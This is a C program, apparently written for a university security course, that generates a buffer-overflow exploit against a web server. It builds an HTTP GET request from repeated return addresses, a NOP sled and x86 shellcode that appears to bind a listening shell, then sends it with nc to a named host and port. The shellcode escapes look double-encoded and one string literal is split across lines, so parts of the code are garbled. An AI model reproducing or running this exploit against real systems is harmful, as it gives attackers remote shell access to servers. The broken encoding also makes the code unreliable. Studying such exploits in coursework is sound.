#include <string.h> 
#include <stdlib.h>
#include <stdio.h>


FILE *fp;
char shellcode[] = "\x5cx31\x5cxdb\x5cxf7\x5cxe3\x5cxb0\x5cx66\x5cx43\x5cx52\x5cx53\x5cx6a\x5cx02\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx5b\x5cx5e\x5cx52\x5cx66\x5cx68\x5cx22\x5cxb8\x5cx6a\x5cx10\x5cx51\x5cx50\x5cxb0
        \x5cx66\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx89\x5cx51\x5cx04\x5cxb0\x5cx66\x5cxb3\x5cx04\x5cxcd\x5cx80\x5cxb0
        \x5cx66\x5cx43\x5cxcd\x5cx80\x5cx59\x5cx93\x5cx6a\x5cx3f\x5cx58\x5cxcd\x5cx80\x5cx49\x5cx79\x5cxf8\x5cxb0
        \x5cx0b\x5cx68\x5cx2f\x5cx2f\x5cx73\x5cx68\x5cx68\x5cx2f\x5cx62\x5cx69\x5cx6e\x5cx89\x5cxe3\x5cx41\x5cxcd\x5cx80";
char ret_address[] = "\x5cx08\x5cxec\x5cxff\x5cxff";
char nops[] = "\x5cx90";

int main(int argc, char** argv) {
    int i;
    char* attack_string = (char *)malloc(4096*sizeof (char));
   
   	strcat(attack_string, "echo -e \x22GET /"); 
    
    for (i = 0; i < atoi(argv[1]); i++) {
        strcat(attack_string, ret_address);
    }
    
    for (i= 0; i < atoi(argv[2]); i++) {
        strcat(attack_string, nops);
    }

    strcat(attack_string,shellcode);
    strcat(attack_string,"HTTP\x22| nc markschreiber-VirtualBox 10071");
    //strcat(attack_string," HTTP | nc 310test.cs.duke.edu 9289");
    
    printf("%s\n", attack_string);
    fp = fopen("shellcode.dat", "w");
    fprintf(fp, "%s", attack_string);
}
   
